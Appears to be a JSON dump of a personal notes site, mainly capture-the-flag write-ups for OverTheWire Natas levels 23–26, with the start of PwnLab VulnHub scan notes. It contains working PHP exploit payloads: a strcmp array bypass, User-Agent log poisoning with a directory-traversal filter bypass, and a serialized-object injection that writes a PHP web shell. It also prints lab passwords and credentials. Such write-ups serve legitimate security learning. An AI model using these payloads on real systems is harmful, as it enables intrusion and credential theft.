'e', or 'E'. Otherwise, it will be evaluated as an integer.  php \u0026gt; $a=(float)\u0026quot;11iloveyou\u0026quot;; php \u0026gt; var_dump($a); float(11) php \u0026gt; echo $a; 11 if(\u0026quot;11iloveyou\u0026quot; \u0026gt; 10 ){echo \u0026quot;a\u0026quot;;} a  The credentials for the next level are:\nUsername: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg\nnatas25 \u0026lt;?php if(array_key_exists(\u0026quot;passwd\u0026quot;,$_REQUEST)){ if(!strcmp($_REQUEST[\u0026quot;passwd\u0026quot;],\u0026quot;\u0026lt;censored\u0026gt;\u0026quot;)){ echo \u0026quot;\u0026lt;br\u0026gt;The credentials for the next level are:\u0026lt;br\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;pre\u0026gt;Username: natas25 Password: \u0026lt;censored\u0026gt;\u0026lt;/pre\u0026gt;\u0026quot;; } else{ echo \u0026quot;\u0026lt;br\u0026gt;Wrong!\u0026lt;br\u0026gt;\u0026quot;; } } // morla / 10111 ?\u0026gt;  https://www.php.net/manual/en/function.strcmp.php\nReturns \u0026lt; 0 if str1 is less than str2; \u0026gt; 0 if str1 is greater than str2, and 0 if they are equal.  Could not figure this one out at first.\nAfter googeling for strcmp php vulnerability i found some posts.\nhttps://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016\nAfter a bit more research, it seemed that strcmp had some issues when comparing a string to something else. If I set $_GET['password'] equal to an empty array, then strcmp would return a NULL. Due to some unherent weaknesses in PHP's comparisons, NULL == 0 will return true (more info)).  https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html\nstrcmp($str1, $str2) (Array injection) Let’s suppose now you are a smart person and are not willing to use the Equal operator. Since you have a beautiful C background, you will stick to strcmp() function. Nice! A function created to compare strings cannot should not be vulnerable when doing its job. According to the docs: strcmp(string $str1, string $str2) –\u0026gt; Returns \u0026lt; 0 if str1 is less than str2; \u0026gt; 0 if str1 is greater than str2, and 0 if they are equal. Ok, so it means every time strcmp(str1, str2) is 0 the strings are equal. Hmmm… What if there was another what to make strcmp() 0? Well, what happens when we pass one string and one non-string parameter like an array to strcmp()? Right, it will result in a false statment and the result of strcmp() will be 0!. \u0026lt;?php $str1 = \u0026quot;pink\u0026quot;; $str2 = array(\u0026quot;name\u0026quot; =\u0026gt; \u0026quot;floyd\u0026quot;); if(strcmp($str1, $str2 == 0)){ echo \u0026quot;OMG twins!\u0026quot;; }else{ echo \u0026quot;Bieber, the king of the world\u0026quot;; } ?\u0026gt; Could you see what would the result be in case we changed str2 the way it is shown above? WARNING strcmp() expects parameter 2 to be string, array given on line number 5 OMG twins! There it is! If we pass an array instead of a string to strcmp(), it gives a warning but evaluates the result as 0. This could be very useful for bypassing logins.  https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf\nSo of we pass passwd[]=1 we can cause \u0026lsquo;strcmp() to barf\u0026rsquo;.\nstrcmp(array(),\u0026quot;\u0026lt;censored\u0026gt;\u0026quot;) -\u0026gt; NULL  if((!strcmp) # is the same as if(strcmp == false)  Since the functions checks for a 0 we can use this \u0026lsquo;barf\u0026rsquo; to get what we want.\nif(!strcmp($_REQUEST[\u0026quot;passwd\u0026quot;],\u0026quot;\u0026lt;censored\u0026gt;\u0026quot;)){ # stuff }  if we pass passwd[]=1 it will look like this.\nif(!strcmp(array(),\u0026quot;\u0026lt;censored\u0026gt;\u0026quot;)){ # stuff }  GHF6X7YwACaYYssHVY05cFq83hRktl4c\nnatas26 \u0026lt;?php // cheers and \u0026lt;3 to malvina // - morla function setLanguage(){ /* language setup */ if(array_key_exists(\u0026quot;lang\u0026quot;,$_REQUEST)) if(safeinclude(\u0026quot;language/\u0026quot; . $_REQUEST[\u0026quot;lang\u0026quot;] )) return 1; safeinclude(\u0026quot;language/en\u0026quot;); } function safeinclude($filename){ // check for directory traversal if(strstr($filename,\u0026quot;../\u0026quot;)){ logRequest(\u0026quot;Directory traversal attempt! fixing request.\u0026quot;); $filename=str_replace(\u0026quot;../\u0026quot;,\u0026quot;\u0026quot;,$filename); } // dont let ppl steal our passwords if(strstr($filename,\u0026quot;natas_webpass\u0026quot;)){ logRequest(\u0026quot;Illegal file access detected! Aborting!\u0026quot;); exit(-1); } // add more checks... if (file_exists($filename)) { include($filename); return 1; } return 0; } function listFiles($path){ $listoffiles=array(); if ($handle = opendir($path)) while (false !== ($file = readdir($handle))) if ($file != \u0026quot;.\u0026quot; \u0026amp;\u0026amp; $file != \u0026quot;..\u0026quot;) $listoffiles[]=$file; closedir($handle); return $listoffiles; } function logRequest($message){ $log=\u0026quot;[\u0026quot;. date(\u0026quot;d.m.Y H::i:s\u0026quot;,time()) .\u0026quot;]\u0026quot;; $log=$log . \u0026quot; \u0026quot; . $_SERVER['HTTP_USER_AGENT']; $log=$log . \u0026quot; \\\u0026quot;\u0026quot; . $message .\u0026quot;\\\u0026quot;\\n\u0026quot;; $fd=fopen(\u0026quot;/var/www/natas/natas25/logs/natas25_\u0026quot; . session_id() .\u0026quot;.log\u0026quot;,\u0026quot;a\u0026quot;); fwrite($fd,$log); fclose($fd); } ?\u0026gt; \u0026lt;h1\u0026gt;natas25\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;content\u0026quot;\u0026gt; \u0026lt;div align=\u0026quot;right\u0026quot;\u0026gt; \u0026lt;form\u0026gt; \u0026lt;select name='lang' onchange='this.form.submit()'\u0026gt; \u0026lt;option\u0026gt;language\u0026lt;/option\u0026gt; \u0026lt;?php foreach(listFiles(\u0026quot;language/\u0026quot;) as $f) echo \u0026quot;\u0026lt;option\u0026gt;$f\u0026lt;/option\u0026gt;\u0026quot;; ?\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php session_start(); setLanguage(); echo \u0026quot;\u0026lt;h2\u0026gt;$__GREETING\u0026lt;/h2\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;p align=\\\u0026quot;justify\\\u0026quot;\u0026gt;$__MSG\u0026quot;; echo \u0026quot;\u0026lt;div align=\\\u0026quot;right\\\u0026quot;\u0026gt;\u0026lt;h6\u0026gt;$__FOOTER\u0026lt;/h6\u0026gt;\u0026lt;div\u0026gt;\u0026quot;; ?\u0026gt;  bypass first the directory traversal check.\nif we pass \u0026hellip;/\u0026hellip;// it will be replaced to ../ .\n// check for directory traversal if(strstr($filename,\u0026quot;../\u0026quot;)){ logRequest(\u0026quot;Directory traversal attempt! fixing equest.\u0026quot;); $filename=str_replace(\u0026quot;../\u0026quot;,\u0026quot;\u0026quot;,$filename); } print str_replace(\u0026quot;../\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;.../...//\u0026quot;); ../  natas25.natas.labs.overthewire.org/?lang=\u0026hellip;/\u0026hellip;//language/de\ngot stuck at this point. Read up on a write up.\nRhe pages echo\u0026rsquo;s 3 values. $**GREETING, $**MSG and $__FOOTER.\necho \u0026quot;\u0026lt;h2\u0026gt;$__GREETING\u0026lt;/h2\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;p align=\\\u0026quot;justify\\\u0026quot;\u0026gt;$__MSG\u0026quot;; echo \u0026quot;\u0026lt;div align=\\\u0026quot;right\\\u0026quot;\u0026gt;\u0026lt;h6\u0026gt;$__FOOTER\u0026lt;/h6\u0026gt;\u0026lt;div\u0026gt;\u0026quot;;  Log function adds text from UserAgent to file if its triggered.\nIt gets triggered if a directory traversal is found. This means if we add PHP code to the UserAgent we can write arbitrary code to logfiles in /var/www/natas/natas25/logs/natas25_SESSIONID.log.\nfunction logRequest($message){ $log=\u0026quot;[\u0026quot;. date(\u0026quot;d.m.Y H::i:s\u0026quot;,time()) .\u0026quot;]\u0026quot;; $log=$log . \u0026quot; \u0026quot; . $_SERVER['HTTP_USER_AGENT']; $log=$log . \u0026quot; \\\u0026quot;\u0026quot; . $message .\u0026quot;\\\u0026quot;\\n\u0026quot;; $fd=fopen(\u0026quot;/var/www/natas/natas25/logs/natas25_\u0026quot; . session_id() .\u0026quot;.log\u0026quot;,\u0026quot;a\u0026quot;); fwrite($fd,$log); fclose($fd); }  If we overwrite either $**GREETING, $**MSG or $__FOOTER by passing PHP code in the UserAgent we can get output back from our arbitrary code.\nUser-Agent: \u0026lt;?php global $__MSG; global $__FOOTER; global $__GREETING; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); $__GREETING=$__MSG; $__FOOTER=$__MSG; ?\u0026gt;  Since the safeinclude does not stop the request we can first trigger a log with a ../ and then add the .../...// for actual directory traversal.\nSo if we combine these 2\nGET /?lang=../.../...//logs/natas25_0fopbbtghrlijbe403knpoa5v5.log HTTP/1.1 Host: natas25.natas.labs.overthewire.org User-Agent: \u0026lt;?php global $__MSG; global $__FOOTER; global $__GREETING; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); $__GREETING=$__MSG; $__FOOTER=$__MSG; ?\u0026gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw== Connection: close Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=0fopbbtghrlijbe403knpoa5v5 Upgrade-Insecure-Requests: 1  [23.09.2019 09::29:37] \u0026quot;Directory traversal attempt! fixing request.\u0026quot; [23.09.2019 09::30:35] \u0026quot;Directory traversal attempt! fixing request.\u0026quot; \u0026lt;h2\u0026gt;oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T \u0026lt;/h2\u0026gt;\u0026lt;p align=\u0026quot;justify\u0026quot;\u0026gt;oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T \u0026lt;div align=\u0026quot;right\u0026quot;\u0026gt;\u0026lt;h6\u0026gt;oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T  oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T\nnatas27 \u0026lt;?php // sry, this is ugly as hell. // cheers kaliman ;) // - morla class Logger{ private $logFile; private $initMsg; private $exitMsg; function __construct($file){ // initialise variables $this-\u0026gt;initMsg=\u0026quot;#--session started--#\\n\u0026quot;; $this-\u0026gt;exitMsg=\u0026quot;#--session end--#\\n\u0026quot;; $this-\u0026gt;logFile = \u0026quot;/tmp/natas26_\u0026quot; . $file . \u0026quot;.log\u0026quot;; // write initial message $fd=fopen($this-\u0026gt;logFile,\u0026quot;a+\u0026quot;); fwrite($fd,$initMsg); fclose($fd); } function log($msg){ $fd=fopen($this-\u0026gt;logFile,\u0026quot;a+\u0026quot;); fwrite($fd,$msg.\u0026quot;\\n\u0026quot;); fclose($fd); } function __destruct(){ // write exit message $fd=fopen($this-\u0026gt;logFile,\u0026quot;a+\u0026quot;); fwrite($fd,$this-\u0026gt;exitMsg); fclose($fd); } } function showImage($filename){ if(file_exists($filename)) echo \u0026quot;\u0026lt;img src=\\\u0026quot;$filename\\\u0026quot;\u0026gt;\u0026quot;; } function drawImage($filename){ $img=imagecreatetruecolor(400,300); drawFromUserdata($img); imagepng($img,$filename); imagedestroy($img); } function drawFromUserdata($img){ if( array_key_exists(\u0026quot;x1\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y1\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;x2\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y2\u0026quot;, $_GET)){ $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$_GET[\u0026quot;x1\u0026quot;], $_GET[\u0026quot;y1\u0026quot;], $_GET[\u0026quot;x2\u0026quot;], $_GET[\u0026quot;y2\u0026quot;], $color); } if (array_key_exists(\u0026quot;drawing\u0026quot;, $_COOKIE)){ $drawing=unserialize(base64_decode($_COOKIE[\u0026quot;drawing\u0026quot;])); if($drawing) foreach($drawing as $object) if( array_key_exists(\u0026quot;x1\u0026quot;, $object) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y1\u0026quot;, $object) \u0026amp;\u0026amp; array_key_exists(\u0026quot;x2\u0026quot;, $object) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y2\u0026quot;, $object)){ $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$object[\u0026quot;x1\u0026quot;],$object[\u0026quot;y1\u0026quot;], $object[\u0026quot;x2\u0026quot;] ,$object[\u0026quot;y2\u0026quot;] ,$color) } } } function storeData(){ $new_object=array(); if(array_key_exists(\u0026quot;x1\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y1\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;x2\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y2\u0026quot;, $_GET)){ $new_object[\u0026quot;x1\u0026quot;]=$_GET[\u0026quot;x1\u0026quot;]; $new_object[\u0026quot;y1\u0026quot;]=$_GET[\u0026quot;y1\u0026quot;]; $new_object[\u0026quot;x2\u0026quot;]=$_GET[\u0026quot;x2\u0026quot;]; $new_object[\u0026quot;y2\u0026quot;]=$_GET[\u0026quot;y2\u0026quot;]; } if (array_key_exists(\u0026quot;drawing\u0026quot;, $_COOKIE)){ $drawing=unserialize(base64_decode($_COOKIE[\u0026quot;drawing\u0026quot;])); } else{ // create new array $drawing=array(); } $drawing[]=$new_object; setcookie(\u0026quot;drawing\u0026quot;,base64_encode(serialize($drawing))); } ?\u0026gt;  \u0026lt;?php session_start(); if (array_key_exists(\u0026quot;drawing\u0026quot;, $_COOKIE) || ( array_key_exists(\u0026quot;x1\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y1\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;x2\u0026quot;, $_GET) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y2\u0026quot;, $_GET))){ $imgfile=\u0026quot;img/natas26_\u0026quot; . session_id() .\u0026quot;.png\u0026quot;; drawImage($imgfile); showImage($imgfile); storeData(); } ?\u0026gt;  GET /?x1=10\u0026amp;y1=10\u0026amp;x2=10\u0026amp;y2=10 HTTP/1.1 Host: natas26.natas.labs.overthewire.org User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA== Connection: close Referer: http://natas26.natas.labs.overthewire.org/ Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=nrf0sdktpqu2fdfgld75cb10s5 Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache  drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ%3D%3D\necho \u0026ldquo;YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ==\u0026rdquo; | base64 -d a:1:{i:0;a:4:{s:2:\u0026ldquo;x1\u0026rdquo;;s:2:\u0026ldquo;10\u0026rdquo;;s:2:\u0026ldquo;y1\u0026rdquo;;s:2:\u0026ldquo;10\u0026rdquo;;s:2:\u0026ldquo;x2\u0026rdquo;;s:2:\u0026ldquo;10\u0026rdquo;;s:2:\u0026ldquo;y2\u0026rdquo;;s:2:\u0026ldquo;10\u0026rdquo;;}} Array ( [0] =\u0026gt; Array ( [x1] =\u0026gt; 10 [y1] =\u0026gt; 10 [x2] =\u0026gt; 10 [y2] =\u0026gt; 10 )\n)\nA Array is serialized and stored as base64 in a cookie called drawing. This means we can send over our own php as the cookie.\nhttps://www.youtube.com/watch?v=uS37TujnLRw\nserializeing data is just a way to export an some data from ram to some other place, like disk or over the network. Deserializeing data takes the seerialezed data and imports it. Serialized data is usally JSON, YAML or XML.\nPHP uses JSON.\nCould not get past this point, this is mostly caused by my lack of programming knowlodge.\nNever worked with classes, let alone construct or decstruct.\nNever worked with serializeing/deserializeing.\nUsed another write anD OWASP up to understand it what was going on.\nhttps://www.owasp.org/index.php/PHP_Object_Injection\nPHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope. In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met: The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a \u0026quot;POP chain\u0026quot;. All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.  class Example1 { public $cache_file; function __construct() { // some PHP code... } function __destruct() { $file = \u0026quot;/var/www/cache/tmp/{$this-\u0026gt;cache_file}\u0026quot;; if (file_exists($file)) @unlink($file); } } // some PHP code... $user_data = unserialize($_GET['data']); // some PHP code...  In this example an attacker might be able to delete an arbitrary file via a Path Traversal attack, for e.g. requesting the following URL: http://testsite.com/vuln.php?data=O:8:\u0026quot;Example1\u0026quot;:1:{s:10:\u0026quot;cache_file\u0026quot;;s:15:\u0026quot;../../index.php\u0026quot;;}  Example 2 The example below shows a PHP class with an exploitable __wakeup method: class Example2 { private $hook; function __construct() { // some PHP code... } function __wakeup() { if (isset($this-\u0026gt;hook)) eval($this-\u0026gt;hook); } } // some PHP code... $user_data = unserialize($_COOKIE['data']); // some PHP code...  In this example an attacker might be able to perform a Code Injection attack by sending an HTTP request like this: GET /vuln.php HTTP/1.0 Host: testsite.com Cookie: data=O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D Connection: close  data=O:8:\u0026quot;Example2\u0026quot;:1:{s:14:\u0026quot;Example2\u0026quot;:\u0026quot;hook\u0026quot;;s:10:\u0026quot;phpinfo();\u0026quot;;}  Where the cookie parameter \u0026quot;data\u0026quot; has been generated by the following script: class Example2 { private $hook = \u0026quot;phpinfo();\u0026quot;; } print urlencode(serialize(new Example2));  Example 3 This last example shows how it is possible to perform a SQL Injection attack using a \u0026quot;POP chain\u0026quot;, for instance by leveraging a __toString method like this: class Example3 { protected $obj; function __construct() { // some PHP code... } function __toString() { if (isset($this-\u0026gt;obj)) return $this-\u0026gt;obj-\u0026gt;getValue(); } } // some PHP code... $user_data = unserialize($_POST['data']); // some PHP code... If the $user_data variable is an \u0026quot;Example3\u0026quot; object and it will be treated like a string somewhere in the code, then its __toString method will be called. Since this method will call the getValue method of the object stored into the \u0026quot;obj\u0026quot; property, it's possible to set that property to an arbitrary object, and execute its getValue method, if it is accessible, otherwise its __call method will be called, if it is defined. For the sake of ease, just think that when unserialize() is called, the class below is available within the application scope (or supported by autoloading): class SQL_Row_Value { private $_table; // some PHP code... function getValue($id) { $sql = \u0026quot;SELECT * FROM {$this-\u0026gt;_table} WHERE id = \u0026quot; . (int)$id; $result = mysql_query($sql, $DBFactory::getConnection()); $row = mysql_fetch_assoc($result); return $row['value']; } } In this example an attacker might be able to perform a SQL Injection attack by sending a POST request containing a \u0026quot;data\u0026quot; parameter generated by a script like this: class SQL_Row_Value { private $_table = \u0026quot;SQL Injection\u0026quot;; } class Example3 { protected $obj; function __construct() { $this-\u0026gt;obj = new SQL_Row_Value; } } print urlencode(serialize(new Example3));  https://n0j.github.io/2017/07/19/otw-natas-26.html\nhttps://n0j.github.io/2016/09/16/tryharder-php-object.html\nOften the way serialization bugs go is something occurs during an object’s constructor or destructor that the attacker can commandeer for nefarious purposes. I wrote about another PHP object serialization challenge here where the contents of a member variable were executed as a command in the constructor.  a constructor is a function which is called automatically when an instance of a class is created and a destructor is a function automatically called when an instance is destroyed. In PHP these are denoted by __construct() and __destruct() in the class definition.  Check out the Logger class. Both the constructor and destructor write to a file. What file? Whatever is stored in the $logFile member variable. What does it write? What ever is stored in the $initMsg and $exitMsg member variables. Ch-ching. Recall that the definition of the class does not go along for the ride when an object is serialized. We only need to make a class named Logger, load up the member variables we want, and send it along. To do that, another short program on the side.  https://www.php.net/manual/en/language.oop5.serialization.php\nclass Logger { private $logFile; private $initMsg; private $exitMsg; function __construct(){ $this-\u0026gt;initMsg=\u0026quot;heyyyyyy\\n\u0026quot;; $this-\u0026gt;exitMsg=\u0026quot;\u0026lt;?php echo file_get_contents('/etc/natas_webpass/natas27'); ?\u0026gt;\\n\u0026quot;; $this-\u0026gt;logFile= \u0026quot;/var/www/natas/natas26/img/n0j.php\u0026quot;; } } $o = new Logger(); print base64_encode(serialize($o)).\u0026quot;\\n\u0026quot;; Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbjBqLnR4dCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjk6ImhleXl5eXl5CiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30= php \u0026gt; exit @0fb5bda9f64c:/# echo \u0026quot;Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbjBqLnR4dCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjk6ImhleXl5eXl5CiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30=\u0026quot; | base64 -d O:6:\u0026quot;Logger\u0026quot;:3:{s:15:\u0026quot;LoggerlogFile\u0026quot;;s:34:\u0026quot;/var/www/natas/natas26/img/n0j.txt\u0026quot;;s:15:\u0026quot;LoggerinitMsg\u0026quot;;s:9:\u0026quot;heyyyyyy \u0026quot;;s:15:\u0026quot;LoggerexitMsg\u0026quot;;s:63:\u0026quot;\u0026lt;?php echo file_get_contents('/etc/natas_webpass/natas27'); ?\u0026gt; \u0026quot;;}  Obviously the message we’re after is the password to natas27 so we grab that and load it into a variable. We know we can write to the img folder because that’s what the application does with legitimate images. We also know we’ll be able to read it back from there, again because that’s what the application does with legitimate images. A note on how this works… why would we send a Logger object into a function that’s expecting arrays with coordinates and whatnot, doesn’t sound like that will work. Short answer - it doesn’t work! But the object is loaded into the $drawing variable so when its life ends the destructor will be called and that’s all we care about.  so basiclly, we overwrite the variables set in the logger class at a later stage in the script. We can do this since unserialize only loads the variables from classes into the application scope, not de the defination of the class it self when the object has been serialized.\nWe can overwrite these values since the cookie is used to send over the serialized data and we have full control over the cookie we send.\nWhen deserializeing the cookie the entire cookie is added to $drawing. This means our initMsg, exitMsg and logFile from our custom logger class are now loaded into the application scope and now have replaced the orginal values when the class was defined.\nif (array_key_exists(\u0026quot;drawing\u0026quot;, $_COOKIE)){ $drawing=unserialize(base64_decode($_COOKIE[\u0026quot;drawing\u0026quot;])); if($drawing) foreach($drawing as $object) if( array_key_exists(\u0026quot;x1\u0026quot;, $object) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y1\u0026quot;, $object) \u0026amp;\u0026amp; array_key_exists(\u0026quot;x2\u0026quot;, $object) \u0026amp;\u0026amp; array_key_exists(\u0026quot;y2\u0026quot;, $object)){ $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$object[\u0026quot;x1\u0026quot;],$object[\u0026quot;y1\u0026quot;], $object[\u0026quot;x2\u0026quot;] ,$object[\u0026quot;y2\u0026quot;] ,$color) } }  Our overwritten variables do something since the destructors uses them. Destruct is called at the end of execution of the script which means our cookie has been loaded and replaced initMsg, exitMsg and logFile.\nfunction __destruct(){ // write exit message $fd=fopen($this-\u0026gt;logFile,\u0026quot;a+\u0026quot;); fwrite($fd,$this-\u0026gt;exitMsg); fclose($fd); }  We now open our custom log file \u0026lsquo;img/n0j.php\u0026rsquo; which contains \u0026lt;?php echo file_get_contents('/etc/natas_webpass/natas27'); ?\u0026gt;\\n\u0026quot;, so we when we load it we get the password of natas27.\n55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/networking/",
	"title": "Networking",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/overthewire/",
	"title": "OverTheWire",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/packettracer/",
	"title": "Packettracer",
	"tags": ["Networking"],
	"description": "Packettracer description.",
	"content": "Packettracer See github.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/pwnlab/",
	"title": "Pwnlab",
	"tags": ["VulnHub"],
	"description": "Notes from the Pwnlab machine from Vulnhub.",
	"content": "pwnlab Info overview Machine    IP Hostname workgroup OS     192.168.56.103       Ports and services    port Service/URL Info     80/tcp http apache 2.4.10 some 5.X version of PHP dir listing images/ upload/ LFI on page param php://filter/convert.base64-encode/resource application stores passwords in base64. see login.php   68/udp dhcpc    111/tcp rpcbind    111/udp rpcbinv    3306/tcp MariaDB (mysql) 5.5.47-0    505111/tcp rpc     Users, hashes and Passwords users    users               passwords    Creds how did i get it what can it access/info     root:H4u%QJ_H99 php://filter/convert.base64-encode/resource=config mysql root   kent:JWzXuBJJNy mysql shell    mike:SIfdsTEn6I mysql shell    kane:iSv5Ym2GRo mysql shell     hashes    user hash cracked           Vulns    Potential Vulns Verified     MySQL - Root Privilege Escalation PoC Exploit []   MySQL 5.5.x/5.6.x/5.7.x - \u0026lsquo;mysql\u0026rsquo; System User Privilege Escalation / Race Condition []    where you at nmap -sn -PR 192.168.56.0/24 -oA scans/arp_scan Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 17:30 CET Nmap scan report for 192.168.56.1 Host is up (0.00014s latency). MAC Address: 0A:00:27:00:00:0A (Unknown) Nmap scan report for 192.168.56.100 Host is up (0.00014s latency). MAC Address: 08:00:27:61:DA:0A (Oracle VirtualBox virtual NIC) Nmap scan report for 192.168.56.103 Host is up (0.00017s latency). MAC Address: 08:00:27:D7:49:EB (Oracle VirtualBox virtual NIC) Nmap scan report for 192.168.56.102 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.07 seconds  what you got TCP # Nmap 7.80 scan initiated Tue Jan 7 17:31:57 2020 as: nmap -p- -A -oA scans/tcp 192.168.56.103 Nmap scan report for 192.168.56.103 Host is up (0.00032s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: PwnLab Intranet Image Hosting 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 41188/udp status | 100024 1 50511/tcp status | 100024 1 56045/tcp6 status |_ 100024 1 59499/udp6 status 3306/tcp open mysql MySQL 5.5.47-0+deb8u1 | mysql-info: | Protocol: 10 | Version: 5.5.47-0+deb8u1 | Thread ID: 38 | Capabilities flags: 63487 | Some Capabilities: ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, FoundRows, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, LongPassword, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments | Status: Autocommit | Salt: 4{3+|PYOb|k$n~QXH@Dw |_ Auth Plugin Name: mysql_native_password 505r11/tcp open status 1 (RPC #100024) MAC Address: 08:00:27:D7:49:EB (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.32 ms 192.168.56.103 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 7 17:32:14 2020 -- 1 IP address (1 host up) scanned in 18.10 seconds  UDP nmap -sU 192.168.56.103 -oA scans/udp Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 19:40 CET Nmap scan report for 192.168.56.103 Host is up (0.00046s latency). Not shown: 998 closed ports PORT STATE SERVICE 68/udp open|filtered dhcpc 111/udp open rpcbind MAC Address: 08:00:27:D7:49:EB (Oracle 